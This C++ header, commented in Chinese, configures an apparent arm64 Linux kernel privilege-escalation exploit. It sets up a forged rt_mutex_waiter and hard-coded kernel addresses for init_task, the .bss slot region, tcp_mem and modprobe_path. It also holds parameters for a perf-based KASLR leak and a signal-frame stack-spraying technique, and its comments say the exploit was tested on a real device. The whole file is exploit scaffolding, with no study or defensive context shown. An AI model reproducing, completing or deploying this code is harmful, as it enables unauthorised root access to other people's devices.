#pragma once
#include <atomic>
#include "tools.h"
// 伪 waiter（rt_mutex_waiter）
inline std::vector<unsigned long> WAITER;
//所有waiter布局
constexpr unsigned long WAITER_LAYOUT_CNT = 3; // waiter布局数量
inline std::vector<std::vector<unsigned long>> waiter_layout(WAITER_LAYOUT_CNT);

// out-qemu 常量族。真机在init_addr()修改。
constexpr unsigned long LINK_DATA_START  = 0xffffff800b400000UL;  // _sdata
inline unsigned long LINK_BSS_START      = 0xffffff800b745000UL;  // __bss_start
inline unsigned long LINK_BSS_STOP       = 0xffffff800c3a9000UL;  // __bss_stop
constexpr unsigned long LINK_TEXT        = 0xffffff8008080000UL;  // _text
constexpr unsigned long LINK_INIT_TASK   = 0xffffff800b41e100UL;  // &init_task
inline unsigned long LINK_LOCK_START     = LINK_BSS_STOP - 0x800;  // = __bss_stop − 0x800，槽开始的位置
constexpr unsigned long LINK_SLOT_SIZE   = 0x20UL;  // sizeof(rt_mutex)
// 槽位区 = .bss 最后 0x800 字节 = 64 个 rt_mutex 槽；构造器把最后一个槽拿去写
// tcp_mem 的 maxlen，所以可用 SLOT 0..62（63 发）。SELPOL 一条命令要 ~16 发，
// 旧的 15 发上限不够用；真机已实测 0..62 连续可用（见详情记忆）。
constexpr unsigned long LINK_SLOT_MAX    = 62; //用完了就得重启机器
inline unsigned long LINK_TCPMEM_DATA    = 0xffffff800b6d3290; // ipv4_table[].data（net/ipv4/sysctl_net_ipv4.c:445)
inline unsigned long LINK_MODPROBE_DATA  = 0xffffff800b42efb8; // modprobe_path[]，自校验牺牲用，cat /proc/sys/kernel/modprobe看原值

// perf 泄漏用的常量
constexpr unsigned long LINK_TEXTOFF    = 0x80000UL; // LINK_TEXT % 0X200000
constexpr unsigned long MIN_SLIDE  = 64UL  << 30; // kaslr.c: offset = BIT(36) + (seed & 0x1FFE00000)
constexpr unsigned long MAX_SLIDE  = 192UL << 30;
constexpr unsigned long PERF_MAXP  = 1'000'000; // 采到的内核指针数上限
inline unsigned long kaslr_slide = 0;      // 泄漏结果

//运行时地址（加上KASLR）
inline unsigned long SLOT = 0; //受环境变量和运行时控制
inline unsigned long LOCK;
inline unsigned long INIT_TASK;
inline unsigned long VICTIM;
inline unsigned long PAYLOAD;

inline unsigned long frq = rdcntfrq();//计数器频率

// lane 11 (lane sigframe)
constexpr unsigned long VREGS_OFF     = 16;        // fpsimd 记录里 vregs 的偏移（记录头 8+4+4）
constexpr int           WAITER_IDX    = 26;        // 512B 内伪 waiter 偏移
constexpr unsigned int  WANT_PGOFF    = 0xF60U;   // frame & 0xFFF：页边界切在 frame+0xA0
constexpr unsigned long FRAME_OFF     = 0x80UL;    // ucontext* − 该值 = frame（内核 regs[2]）
constexpr unsigned long MAP_FILE_LEN  = 0x20000UL;  // 取值范围大概 = (ss_size+1KiB(ss_size运行时自动校准), store_file_size)
constexpr unsigned long SS_SIZE       = 0x10000UL;  // ss_size 初值，运行时自动校准。为防止栈溢出，默认64KiB

//阻塞源
inline int store_fd = -1; //阻塞文件
inline const char* STORE_PATH = "/mnt1/erblk"; //真机init_addr()改
constexpr unsigned long STORE_FILE_SIZE = 0x400'000UL;   // 4 MiB，信号栈完全够用

//信号handler
extern "C" {
inline std::atomic<unsigned long> sigframe = 0; //信号帧
inline bool check_mode = false; //ss_size校准用
}
inline std::atomic<bool> w_done{}; //信号处理函数涂完栈设置